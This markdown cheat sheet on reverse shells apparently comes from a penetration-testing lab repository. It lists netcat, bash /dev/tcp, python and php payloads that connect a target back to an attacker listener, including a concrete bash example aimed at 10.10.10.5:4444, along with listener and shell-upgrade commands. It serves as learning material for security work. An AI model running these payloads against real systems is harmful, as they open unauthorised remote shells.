# Reverse Shells Cheat Sheet

> [!NOTE]
> A reverse shell technique was not used in this specific lab — access was gained directly via SSH (see [`docs/06-Initial-Access`](../docs/06-Initial-Access/README.md)). This cheat sheet is provided as general reference material for future engagements where a reverse shell is the appropriate access method (e.g., via a web application vulnerability).

## Overview

A reverse shell is a shell session initiated *from* the target *back to* an attacker-controlled listener, commonly used when direct inbound access to a target is blocked but the target can make outbound connections.

## Common Syntax

```bash
# Attacker: start a listener
nc -lvnp <port>

# Target: connect back and spawn a shell
<reverse-shell-payload>
```

## Useful Commands

| Payload | Description |
|---|---|
| `nc -e /bin/sh <attacker-ip> <port>` | Netcat with `-e` (execute) support |
| `bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1` | Bash's built-in `/dev/tcp` reverse shell |
| `python3 -c 'import socket,os,pty;...'` | Python-based reverse shell |
| `php -r '$sock=fsockopen(...);...'` | PHP-based reverse shell |

## Important Options

| Option | Description |
|---|---|
| `-lvnp` (netcat) | Listen, verbose, no DNS resolution, specified port |
| `-i` (bash) | Interactive shell |

## Examples

General reference examples (not used in this lab):

**Attacker (listener):**

```bash
nc -lvnp 4444
```

**Target (payload, conceptual — exact syntax depends on available interpreter):**

```bash
bash -i >& /dev/tcp/10.10.10.5/4444 0>&1
```

## Common Mistakes

- Starting the listener *after* triggering the payload instead of before.
- Choosing a payload interpreter that isn't actually present on the target (e.g., assuming Python is installed without checking).
- Forgetting to stabilize/upgrade the shell (e.g., via `python3 -c 'import pty; pty.spawn("/bin/bash")'`) after catching a raw reverse shell, leading to a fragile, non-interactive session.

## References

- [`cheatsheets/netcat.md`](netcat.md)
- [PayloadsAllTheThings — Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

## Key Takeaways

- Always start the attacker-side listener before triggering a reverse shell payload on the target.
- Confirm which interpreters (bash, python, php, etc.) are actually available on the target before selecting a payload.
